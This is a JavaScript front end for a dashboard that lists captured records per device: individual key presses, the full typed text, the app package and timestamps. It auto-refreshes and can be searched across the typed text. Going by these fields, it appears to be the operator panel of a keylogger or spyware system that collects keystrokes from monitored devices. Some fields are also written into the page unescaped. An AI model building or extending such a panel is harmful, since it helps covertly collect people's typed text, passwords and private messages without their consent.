const recordsBody = document.getElementById("recordsBody");
const deviceFilter = document.getElementById("deviceFilter");
const searchInput = document.getElementById("searchInput");
const limitFilter = document.getElementById("limitFilter");
const totalRecords = document.getElementById("totalRecords");
const totalDevices = document.getElementById("totalDevices");
const lastUpdated = document.getElementById("lastUpdated");
const refreshBtn = document.getElementById("refreshBtn");

let allRecords = [];

function formatDate(value) {
  return new Date(value).toLocaleString();
}

function renderRecords(records) {
  if (!records.length) {
    recordsBody.innerHTML = '<tr><td colspan="7" class="empty">No records found.</td></tr>';
    return;
  }

  recordsBody.innerHTML = records
    .map(
      (record) => `
      <tr>
        <td class="mono">${record.recordId}</td>
        <td class="mono">${record.deviceUniqueId}</td>
        <td>${escapeHtml(record.keyPressed)}</td>
        <td>${escapeHtml(record.fullText || "")}</td>
        <td class="mono">${record.appPackage || "unknown"}</td>
        <td><span class="badge">${record.action || "key"}</span></td>
        <td>${formatDate(record.createdAt)}</td>
      </tr>
    `
    )
    .join("");
}

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;");
}

function applyFilters() {
  const deviceId = deviceFilter.value;
  const search = searchInput.value.trim().toLowerCase();

  let filtered = allRecords;

  if (deviceId) {
    filtered = filtered.filter((record) => record.deviceUniqueId === deviceId);
  }

  if (search) {
    filtered = filtered.filter(
      (record) =>
        String(record.keyPressed).toLowerCase().includes(search) ||
        String(record.fullText || "").toLowerCase().includes(search) ||
        String(record.recordId).toLowerCase().includes(search)
    );
  }

  renderRecords(filtered);
}

async function loadDevices() {
  const response = await fetch("/api/devices");
  const result = await response.json();
  const current = deviceFilter.value;

  deviceFilter.innerHTML = '<option value="">All devices</option>';
  result.data.forEach((device) => {
    const option = document.createElement("option");
    option.value = device.deviceUniqueId;
    option.textContent = `${device.deviceUniqueId.slice(0, 8)}... (${device.count})`;
    deviceFilter.appendChild(option);
  });

  deviceFilter.value = current;
  totalDevices.textContent = result.data.length;
}

async function loadRecords() {
  const limit = limitFilter.value;
  const deviceId = deviceFilter.value;
  const query = new URLSearchParams({ limit });

  if (deviceId) {
    query.set("deviceUniqueId", deviceId);
  }

  const response = await fetch(`/api/records?${query.toString()}`);
  const result = await response.json();

  allRecords = result.data;
  totalRecords.textContent = result.total;
  lastUpdated.textContent = new Date().toLocaleTimeString();
  applyFilters();
}

async function refreshDashboard() {
  recordsBody.innerHTML = '<tr><td colspan="7" class="empty">Loading records...</td></tr>';
  await Promise.all([loadDevices(), loadRecords()]);
}

refreshBtn.addEventListener("click", refreshDashboard);
deviceFilter.addEventListener("change", loadRecords);
limitFilter.addEventListener("change", loadRecords);
searchInput.addEventListener("input", applyFilters);

refreshDashboard();
setInterval(refreshDashboard, 15000);
